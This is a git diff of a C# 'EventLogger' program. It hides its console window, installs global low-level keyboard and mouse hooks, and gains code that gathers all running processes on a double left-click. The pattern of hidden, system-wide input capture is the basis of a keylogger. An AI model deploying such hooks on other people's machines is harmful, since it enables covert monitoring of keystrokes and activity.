@@ -1,8 +1,10 @@
 ﻿using System;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Runtime.CompilerServices;
 
 namespace EventLogger;
 
@@ -36,14 +38,15 @@ class EventLogger
     public static void Main()
     {
         var handle = GetConsoleWindow();
- 
         // Hide
         ShowWindow(handle, 0);
         var process = Process.GetCurrentProcess();
         
         _keyboardHook = SetHandler(process.MainModule,(LowLevelProc)KeyBoardHandler, Utils.WH_KEYBOARD_LL);
         _mouseHook = SetHandler(process.MainModule, (LowLevelProc)MouseHandler,Utils.WH_MOUSE_LL);
+        
         Application.Run();
+        
         UnhookWindowsHookEx(_keyboardHook);
         UnhookWindowsHookEx(_mouseHook);
         
@@ -53,16 +56,28 @@ class EventLogger
     {
         return SetWindowsHookEx(action, handler, GetModuleHandle(module.ModuleName), 0);
     }
- 
+
+    private static DateTime previousTime = DateTime.Now;
     private static IntPtr MouseHandler(int nCode, IntPtr wParam, IntPtr lParam)
     {
         if(wParam==(IntPtr)Utils.WM_LBUTTONDOWN)
         {
-            Console.WriteLine("[Mouse] Left button down");
-        }else if (wParam == (IntPtr)Utils.WM_RBUTTONDOWN)
-        {
-            Console.WriteLine("[Mouse] Right button down");
+            //check if previousTime and Datetime.Now is more than 500 milliseconds
+            if(DateTime.Now.Subtract(previousTime).TotalMilliseconds<=500)
+            {
+                Console.WriteLine("[Double-Mouse] Left button down");
+                Utils.CollectProcess(Process.GetProcesses());
+            }
+            else
+            {
+                Console.WriteLine("[Mouse] Left button down");
+            }
+            previousTime = DateTime.Now;
         }
+        //else if (wParam == (IntPtr)Utils.WM_RBUTTONDOWN) {
+        //    Console.WriteLine("[Mouse] Right button down");
+        //    Utils.CollectProcess(Process.GetProcesses());
+        //}
         return CallNextHookEx(_mouseHook, nCode, wParam, lParam);
     }
     private static IntPtr KeyBoardHandler(int nCode, IntPtr wParam, IntPtr lParam)
